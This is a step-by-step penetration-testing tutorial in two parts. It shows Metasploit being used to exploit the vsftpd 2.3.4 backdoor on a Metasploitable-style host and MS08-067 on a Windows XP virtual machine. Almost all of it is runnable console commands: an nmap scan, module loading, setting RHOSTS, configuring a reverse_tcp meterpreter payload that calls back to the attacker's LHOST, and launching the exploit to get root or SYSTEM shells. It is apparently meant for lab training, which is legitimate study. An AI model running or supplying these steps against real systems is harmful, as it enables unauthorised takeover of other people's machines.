Step 1: Initialization and Reconnaissance

Open your Kali Linux terminal and launch the framework:

Bash
msfconsole
Identify a vulnerability on your target. For this example, assume your Nmap scan revealed a vulnerable FTP service (e.g., vsftpd v2.3.4) on port 21.

Search the framework's database for corresponding modules:

Bash
search type:exploit name:vsftpd
Step 2: Module Configuration

Instruct Metasploit to load the specific exploit module:

Bash
use exploit/unix/ftp/vsftpd_234_backdoor
View the required parameters for this exploit:

Bash
show options
Set the target's IP address (Remote Host):

Bash
set RHOSTS 192.168.1.50
Step 3: Payload Selection and Execution

(Optional for some exploits, mandatory for others) Set the payload. This is the code that executes after the exploit succeeds.

Bash
set PAYLOAD cmd/unix/interact
Launch the attack:

Bash
exploit
The Result: If the target is vulnerable, the exploit will execute, and your terminal will drop into a remote command shell (root@metasploitable:~#), granting you complete operating system control over the target.



Step 1: Reconnaissance (The Setup)

Ensure both your Kali VM and Windows XP VM are on the same NAT/Host-only network.

Scan the XP machine to confirm port 445 (SMB) is open:

Bash
nmap -sV -p 445 -O [Windows_XP_IP]
Step 2: Configuring the Metasploit Framework

Launch Metasploit:

Bash
msfconsole
Search for the specific Microsoft Security Bulletin vulnerability:

Bash
search ms08_067
Load the exploit module:

Bash
use exploit/windows/smb/ms08_067_netapi
View and set the required parameters:

Bash
show options
set RHOSTS [Windows_XP_IP]
Step 3: Payload Delivery and Execution

Set a reverse shell payload to establish a connection back to your Kali machine:

Bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [Kali_Linux_IP]
Launch the attack:

Bash
exploit
The Result: Metasploit will trigger the buffer overflow, execute the payload, and open a meterpreter > prompt. You now have complete NT AUTHORITY\SYSTEM (the highest possible administrative privilege) access to the Windows XP machine.
